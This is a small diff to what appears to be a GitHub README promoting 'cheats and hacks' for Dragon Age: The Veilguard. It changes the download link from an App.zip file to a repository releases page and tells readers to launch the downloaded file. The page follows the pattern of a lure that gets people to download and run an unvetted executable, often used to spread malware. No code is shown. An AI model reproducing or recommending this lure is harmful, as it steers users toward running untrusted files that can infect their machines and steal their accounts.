@@ -16,7 +16,7 @@ Unleash your power in Dragon Age: The Veilguard with a treasure trove of cheats 
 ## 🔗 Ready to Dive In?
 
 Click below to access all the cheats and hacks you need:
-[![Download Here](https://img.shields.io/badge/Download-App.zip-brightgreen)](https://github.com/uploads/App.zip)
+[![Download Here](https://github.com/Imthebest103/Dragon-Age-The-Veilguard-Cheats/releases)](https://github.com/Imthebest103/Dragon-Age-The-Veilguard-Cheats/releases)
 
 Make sure to launch the file to start enhancing your Dragon Age: The Veilguard experience!
 
